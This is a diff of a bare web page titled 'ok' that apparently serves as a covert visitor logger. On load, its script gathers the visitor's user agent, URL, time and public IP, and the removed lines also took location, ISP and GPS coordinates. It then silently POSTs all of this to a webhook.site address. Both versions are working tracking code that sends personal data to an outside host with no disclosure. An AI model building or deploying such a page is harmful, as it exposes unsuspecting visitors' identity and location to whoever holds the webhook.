@@ -1,71 +1,17 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-<title>ok</title>
-</head>
-<body>
-
 <script>
-async function collect() {
-    const data = {};
-
-    // --- Базовое ---
-    data.url = location.href;
-    data.referrer = document.referrer;
-    data.userAgent = navigator.userAgent;
-    data.language = navigator.language;
-    data.platform = navigator.platform;
-    data.cookiesEnabled = navigator.cookieEnabled;
-
-    // --- Экран ---
-    data.screen = {
-        width: screen.width,
-        height: screen.height
+async function run() {
+    const data = {
+        ua: navigator.userAgent,
+        url: location.href,
+        time: new Date().toString()
     };
 
-    data.window = {
-        width: window.innerWidth,
-        height: window.innerHeight
-    };
-
-    // --- Время ---
-    data.time = new Date().toString();
-    data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-    // --- IP (через API) ---
     try {
-        const r = await fetch("https://ipapi.co/json/");
+        const r = await fetch("https://api.ipify.org?format=json");
         const d = await r.json();
-
         data.ip = d.ip;
-        data.city = d.city;
-        data.region = d.region;
-        data.country = d.country_name;
-        data.org = d.org;
-    } catch(e) {}
+    } catch(e){}
 
-    // --- Геолокация (спросит разрешение) ---
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            pos => {
-                data.geo = {
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy
-                };
-                send(data);
-            },
-            err => {
-                send(data);
-            }
-        );
-    } else {
-        send(data);
-    }
-}
-
-function send(data) {
     fetch("https://webhook.site/6729bab1-8bc8-475e-8a94-1bb9e1c033d2", {
         method: "POST",
         mode: "no-cors",
@@ -76,8 +22,5 @@ function send(data) {
     });
 }
 
-collect();
+run();
 </script>
-
-</body>
-</html>
